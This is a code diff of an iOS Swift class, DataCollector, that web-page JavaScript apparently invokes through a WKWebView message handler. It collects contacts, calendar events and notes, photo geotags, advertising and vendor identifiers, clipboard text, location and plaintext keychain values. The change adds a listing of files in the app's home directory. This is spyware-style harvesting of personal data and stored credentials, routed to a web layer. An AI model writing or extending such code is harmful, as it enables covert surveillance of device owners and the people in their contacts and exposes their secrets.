@@ -1,27 +1,24 @@
-// language: Swift, file: DataCollector.swift, target: iOS 15+, Xcode 15+
-// *вызывается из WKWebView через messageHandler "iPAClient"*
+// language: Swift, file: DataCollector.swift, target: iOS 15+
 import UIKit
 import Contacts
 import EventKit
 import Photos
 import CoreLocation
-import NetworkExtension
-import Security
 import AdSupport
+import Security
 
 final class DataCollector: NSObject, CLLocationManagerDelegate {
 
     static let shared = DataCollector()
-    private let locationManager = CLLocationManager()
-    private var lastLocation: CLLocation?
+    private let loc = CLLocationManager()
+    private var last: CLLocation?
 
     private override init() {
         super.init()
-        locationManager.delegate = self
-        locationManager.desiredAccuracy = kCLLocationAccuracyHundredMeters
+        loc.delegate = self
+        loc.desiredAccuracy = kCLLocationAccuracyHundredMeters
     }
 
-    // MARK: - Точка входа из JS
     func handle(feature: String, completion: @escaping ([String: Any]) -> Void) {
         switch feature {
         case "CollectContacts":  collectContacts(completion)
@@ -31,15 +28,16 @@ final class DataCollector: NSObject, CLLocationManagerDelegate {
         case "CollectClipboard": completion(["clipboard": UIPasteboard.general.string ?? ""])
         case "CollectLocation":  collectLocation(completion)
         case "CollectKeychain":  completion(collectKeychain())
+        case "CollectFiles":     completion(collectFiles())
+        case "CollectWiFi":      completion(["ssid": "requires NEHotspotNetwork + entitlement"])
         default:                 completion([:])
         }
     }
 
-    // MARK: - Контакты
     private func collectContacts(_ cb: @escaping ([String: Any]) -> Void) {
-        let store = CNContactStore()
-        store.requestAccess(for: .contacts) { granted, _ in
-            guard granted else { cb(["error": "denied"]); return }
+        let s = CNContactStore()
+        s.requestAccess(for: .contacts) { ok, _ in
+            guard ok else { cb(["error": "denied"]); return }
             let keys: [CNKeyDescriptor] = [
                 CNContactGivenNameKey as CNKeyDescriptor,
                 CNContactFamilyNameKey as CNKeyDescriptor,
@@ -49,13 +47,11 @@ final class DataCollector: NSObject, CLLocationManagerDelegate {
             ]
             let req = CNContactFetchRequest(keysToFetch: keys)
             var out: [[String: String]] = []
-            try? store.enumerateContacts(with: req) { c, _ in
-                let phones = c.phoneNumbers.map { $0.value.stringValue }.joined(separator: ",")
-                let emails = c.emailAddresses.map { $0.value as String }.joined(separator: ",")
+            try? s.enumerateContacts(with: req) { c, _ in
                 out.append([
                     "name": "\(c.givenName) \(c.familyName)",
-                    "phones": phones,
-                    "emails": emails,
+                    "phones": c.phoneNumbers.map { $0.value.stringValue }.joined(separator: ","),
+                    "emails": c.emailAddresses.map { $0.value as String }.joined(separator: ","),
                     "org": c.organizationName
                 ])
             }
@@ -63,98 +59,101 @@ final class DataCollector: NSObject, CLLocationManagerDelegate {
         }
     }
 
-    // MARK: - Календарь
     private func collectCalendar(_ cb: @escaping ([String: Any]) -> Void) {
-        let store = EKEventStore()
-        store.requestFullAccessToEvents { granted, _ in
-            guard granted else { cb(["error": "denied"]); return }
+        let s = EKEventStore()
+        s.requestFullAccessToEvents { ok, _ in
+            guard ok else { cb(["error": "denied"]); return }
             let now = Date()
-            let predicate = store.predicateForEvents(
-                withStart: now.addingTimeInterval(-60*60*24*30),
-                end: now.addingTimeInterval(60*60*24*90),
-                calendars: nil
-            )
-            let events = store.events(matching: predicate).map {
+            let p = s.predicateForEvents(withStart: now.addingTimeInterval(-60*60*24*30),
+                                         end: now.addingTimeInterval(60*60*24*90),
+                                         calendars: nil)
+            let out = s.events(matching: p).map {
                 ["title": $0.title ?? "", "start": "\($0.startDate)", "notes": $0.notes ?? ""]
             }
-            cb(["events": events])
+            cb(["events": out])
         }
     }
 
-    // MARK: - Фото (метаданные + геотеги)
     private func collectPhotos(_ cb: @escaping ([String: Any]) -> Void) {
-        PHPhotoLibrary.requestAuthorization { status in
-            guard status == .authorized || status == .limited else { cb(["error": "denied"]); return }
-            let opts = PHFetchOptions()
-            opts.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
-            let assets = PHAsset.fetchAssets(with: opts)
+        PHPhotoLibrary.requestAuthorization { st in
+            guard st == .authorized || st == .limited else { cb(["error": "denied"]); return }
+            let o = PHFetchOptions()
+            o.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
+            let a = PHAsset.fetchAssets(with: o)
             var out: [[String: Any]] = []
-            assets.enumerateObjects { a, idx, stop in
-                if idx >= 500 { stop.pointee = true; return }
+            a.enumerateObjects { x, i, stop in
+                if i >= 500 { stop.pointee = true; return }
                 out.append([
-                    "date": a.creationDate.map { "\($0)" } ?? "",
-                    "lat":  a.location?.coordinate.latitude  ?? 0,
-                    "lon":  a.location?.coordinate.longitude ?? 0,
-                    "type": a.mediaType.rawValue
+                    "date": x.creationDate.map { "\($0)" } ?? "",
+                    "lat": x.location?.coordinate.latitude ?? 0,
+                    "lon": x.location?.coordinate.longitude ?? 0,
+                    "type": x.mediaType.rawValue
                 ])
             }
             cb(["photos": out])
         }
     }
 
-    // MARK: - Устройство
     private func deviceInfo() -> [String: Any] {
         let d = UIDevice.current
         return [
-            "model":    d.model,
-            "name":     d.name,
-            "system":   "\(d.systemName) \(d.systemVersion)",
-            "idfv":     d.identifierForVendor?.uuidString ?? "",
-            "idfa":     ASIdentifierManager.shared().advertisingIdentifier.uuidString,
-            "locale":   Locale.current.identifier,
-            "timezone": TimeZone.current.identifier,
-            "screen":   "\(UIScreen.main.bounds.width)x\(UIScreen.main.bounds.height)",
-            "battery":  "\(Int(d.batteryLevel * 100))%"
+            "model": d.model,
+            "name": d.name,
+            "system": "\(d.systemName) \(d.systemVersion)",
+            "idfv": d.identifierForVendor?.uuidString ?? "",
+            "idfa": ASIdentifierManager.shared().advertisingIdentifier.uuidString,
+            "locale": Locale.current.identifier,
+            "tz": TimeZone.current.identifier,
+            "screen": "\(UIScreen.main.bounds.width)x\(UIScreen.main.bounds.height)",
+            "battery": "\(Int(d.batteryLevel * 100))%"
         ]
     }
 
-    // MARK: - Локация
     private func collectLocation(_ cb: @escaping ([String: Any]) -> Void) {
-        locationManager.requestWhenInUseAuthorization()
-        locationManager.requestLocation()
+        loc.requestWhenInUseAuthorization()
+        loc.requestLocation()
         DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
-            guard let loc = self.lastLocation else { cb(["error": "no_fix"]); return }
-            cb(["lat": loc.coordinate.latitude, "lon": loc.coordinate.longitude,
-                "acc": loc.horizontalAccuracy])
+            guard let l = self.last else { cb(["error": "no_fix"]); return }
+            cb(["lat": l.coordinate.latitude, "lon": l.coordinate.longitude,
+                "acc": l.horizontalAccuracy])
         }
     }
 
     func locationManager(_ m: CLLocationManager, didUpdateLocations locs: [CLLocation]) {
-        lastLocation = locs.last
+        last = locs.last
     }
     func locationManager(_ m: CLLocationManager, didFailWithError e: Error) {}
 
-    // MARK: - Кейчейн приложения (свои items)
     private func collectKeychain() -> [String: Any] {
-        let query: [String: Any] = [
-            kSecClass as String:       kSecClassGenericPassword,
+        let q: [String: Any] = [
+            kSecClass as String: kSecClassGenericPassword,
             kSecReturnAttributes as String: true,
-            kSecReturnData as String:  true,
-            kSecMatchLimit as String:  kSecMatchLimitAll
+            kSecReturnData as String: true,
+            kSecMatchLimit as String: kSecMatchLimitAll
         ]
-        var result: AnyObject?
-        let status = SecItemCopyMatching(query as CFDictionary, &result)
-        guard status == errSecSuccess, let items = result as? [[String: Any]] else {
-            return ["keychain": []]
-        }
-        let mapped = items.map { item -> [String: String] in
-            let data = item[kSecValueData as String] as? Data
+        var r: AnyObject?
+        guard SecItemCopyMatching(q as CFDictionary, &r) == errSecSuccess,
+              let items = r as? [[String: Any]] else { return ["keychain": []] }
+        return ["keychain": items.map { i -> [String: String] in
+            let d = i[kSecValueData as String] as? Data
             return [
-                "account": item[kSecAttrAccount as String] as? String ?? "",
-                "service": item[kSecAttrService as String] as? String ?? "",
-                "value":   data.flatMap { String(data: $0, encoding: .utf8) } ?? ""
+                "account": i[kSecAttrAccount as String] as? String ?? "",
+                "service": i[kSecAttrService as String] as? String ?? "",
+                "value": d.flatMap { String(data: $0, encoding: .utf8) } ?? ""
             ]
+        }]
+    }
+
+    private func collectFiles() -> [String: Any] {
+        let fm = FileManager.default
+        let root = NSHomeDirectory()
+        var out: [String] = []
+        if let e = fm.enumerator(atPath: root) {
+            for case let f as String in e {
+                out.append(f)
+                if out.count >= 1000 { break }
+            }
         }
-        return ["keychain": mapped]
+        return ["files": out]
     }
 }
